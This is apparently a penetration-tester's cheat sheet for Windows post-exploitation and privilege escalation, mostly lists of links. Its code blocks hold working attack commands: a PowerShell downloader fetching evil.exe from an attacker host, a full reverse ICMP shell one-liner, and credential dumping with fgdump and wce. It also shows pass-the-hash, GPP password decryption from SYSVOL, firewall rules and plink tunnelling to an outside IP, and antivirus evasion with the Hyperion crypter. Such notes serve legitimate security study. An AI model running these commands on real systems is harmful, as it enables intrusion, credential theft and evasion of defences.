# Post-Exploitation & Privilege Escalation

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

[https://github.com/GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

[https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)

[http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port\_23.html](http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port_23.html)

[https://www.youtube.com/watch?v=kMG8IsCohHA](https://www.youtube.com/watch?v=kMG8IsCohHA)

[https://www.youtube.com/watch?v=PC\_iMqiuIRQ](https://www.youtube.com/watch?v=PC_iMqiuIRQ)

[https://www.youtube.com/watch?v=PC\_iMqiuIRQ](https://www.youtube.com/watch?v=PC_iMqiuIRQ)

[https://www.youtube.com/watch?v=kMG8IsCohHA](https://www.youtube.com/watch?v=kMG8IsCohHA)

[http://www.fuzzysecurity.com/tutorials/18.html](http://www.fuzzysecurity.com/tutorials/18.html)

[http://www.fuzzysecurity.com/tutorials/24.html](http://www.fuzzysecurity.com/tutorials/24.html)

[http://www.fuzzysecurity.com/tutorials/27.html](http://www.fuzzysecurity.com/tutorials/27.html)

[https://decoder.cloud/2017/02/11/grab-the-windows-secrets/](https://decoder.cloud/2017/02/11/grab-the-windows-secrets/)

[http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/](http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/)

[http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/](http://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)

[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)

[https://blog.harmj0y.net/](https://blog.harmj0y.net/)

[http://malware.dontneedcoffee.com/](http://malware.dontneedcoffee.com/)

[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

[https://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python](https://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)

[https://www.youtube.com/watch?v=6fbotSZeFkQ&list=PL-giMT7sGCVJQIgB06ock6ptjKvSc-rXc](https://www.youtube.com/watch?v=6fbotSZeFkQ&list=PL-giMT7sGCVJQIgB06ock6ptjKvSc-rXc)

[http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/](http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/)

[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)

[http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html](http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)

[https://toshellandback.com/2015/11/24/ms-priv-esc/](https://toshellandback.com/2015/11/24/ms-priv-esc/)

[https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)

[https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

[https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf](https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)

[https://cert.europa.eu/static/WhitePapers/UPDATED - CERT-EU\_Security\_Whitepaper\_2014-007\_Kerberos\_Golden\_Ticket\_Protection\_v1\_4.pdf](https://cert.europa.eu/static/WhitePapers/UPDATED - CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)

[http://cybersecology.com/wp-content/uploads/2016/05/Golden\_Ticket-v1.13-Final.pdf](http://cybersecology.com/wp-content/uploads/2016/05/Golden_Ticket-v1.13-Final.pdf)

[https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)

[https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)

[http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/](http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/)

[http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)

[https://github.com/PyroTek3/PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)

[https://github.com/mubix/netview](https://github.com/mubix/netview)

[https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide](https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide)

https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf

##### Cross Compiling from Kali

```
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

##### Transpile Python into EXE

```
Kali> python pyinstaller.py --onefile file.py
```

##### Uploading Files

```
Kali> cp /usr/share/windows-binaries/nc.exe
Kali> upx -9 nc.exe
Kali> wine exe2bat.exe nc.exe nc.txt
```

##### Powershell Foo

> ###### wget

```
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$ATTACKER/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1    
echo $webclient.DownloadFile($url,$file) >> wget.ps1

C:\> powershell.exe -ExecutionPolicy Bypass ‐NoLogo  ‐NonInteractive  ‐NoProfile ‐File wget.ps1
```

> ###### Execute ps1

```
C:\> powershell -exec bypass -windowstyle hidden -nop -file c:\path\to\file.ps1
```

> ###### Stream contents of file

```
C:\> Get-Item /path/to/file.zip -Stream *
```

> ###### Get permissions of directory/file

```
C:\> Get-ACL C:\path\to\file\or\directory
```

> ###### Packet testing

```
# TCP
# Setup TCP Listener ie: netcat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.TcpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie")$client.Send($packet, $packet.Length);$client.Close();'

# UDP
# Setup UDP Listener ie: socat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.UdpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send($packet, $packet.Length);$client.Close();'

# ICMP
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET
C:\> powershell -Command '$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $True;$packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send("10.10.14.42", 500, $packet, $options);'
```

> ###### Reverse ICMP shell

```
Kali> sudo bash -c "echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET

C:\> powershell -nop -Command "$IP = '10.10.14.42';$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $true;$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes('pie'), $options);while($true){$comms = $client.Send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes(''), $options);if($comms.Buffer){ $cmd = ([Text.Encoding]::ASCII).GetString($comms.Buffer);$reply = (Invoke-Expression -Command $cmd | Out-String);$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes($reply), $options);}}"
```

##### LDAP

[http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html](http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html)

##### Dump Hashes

```
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump
```

##### WCE

```
C:\> wce -w
```

##### PSExec

You need to be an admin already it copies an executable to an admin share and registers a service and starts it

[https://technet.microsoft.com/en-us/sysinternals/psexec.aspx](https://technet.microsoft.com/en-us/sysinternals/psexec.aspx)

[https://sourceforge.net/projects/winexe/](https://sourceforge.net/projects/winexe/)

[https://www.rapid7.com/db/modules/exploit/windows/smb/psexec\_psh](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)

[http://www.powershellempire.com/?page\_id=523](http://www.powershellempire.com/?page_id=523)

##### UAC

##### [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

##### WMIC

##### [https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py)

##### Insecure File Permissions

```
C:\> icacls example.exe
```

##### [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)

##### Insecure SYSVOL

```
C:\> net use z: \\dc01\SYSVOL
Z:\> dir /s Groups.xml
Z:\> copy
Kali> gpp-decrypt
```

##### Token Stealing

Once you have admin access on a computer, you can use the tokens of the other users to access resources in the domain.

##### Passing the Hash

```
Kali> export SMBHASH="HASH"
Kali> pth-winexe -U administrator //$TARGET cmd
```

##### [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

##### Passing the Ticket

> ###### TODO

##### Process Injection

##### [https://github.com/n1nj4sec/pupy](https://github.com/n1nj4sec/pupy)

##### [http://www.powershellempire.com/?page\_id=273](http://www.powershellempire.com/?page_id=273)

##### runas

##### [https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps)

##### [https://ss64.com/nt/runas.html](https://ss64.com/nt/runas.html)

##### Encapsulating SSH Traffic with httptunnel

```
# Bypass Notify with administrative account
$secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force
$mycreds = New-Object System.Management.Automtion.PSCredential("Administrator", $secpasswd)
$computer = "DEV01"
powershell -ExecutionPolicy Bypass -File c:\Windows\temp\run.ps1

# add ruleset for firewall
C:\> netsh advfirewall firewall add rule name ="httptunnel_client" dir=in action=allow program="httptunnel_client.exe enable=yes
C:\> netsh advfirewall firewall add rule name ="3000" dir=in action=allow protocol=TCP localport=3000
C:\> netsh advfirewall firewall add rule name="1080 dir=in action=allow protocol=TCP localport=1080
C:\> netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079
C:\> httptunnel_client.exe

# upload /usr/share/windows-binaries/plink.exe then setup port forward
C:\> plink -l root -pw pass -R 3389:127.0.0.1:3389 208.68.234.99 -P 3000

# Bypass Anti-virus
Kali> cp payload.exe newpayload.exe
Kali> cp /usr/share/windows-binaries/Hyperion-1.0.zip .
Kali> i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe
Kali> wine hyperion.exe ../newpayload.exe ../crypted.exe
```

[https://github.com/secretsquirrel/SigThief](https://github.com/secretsquirrel/SigThief)

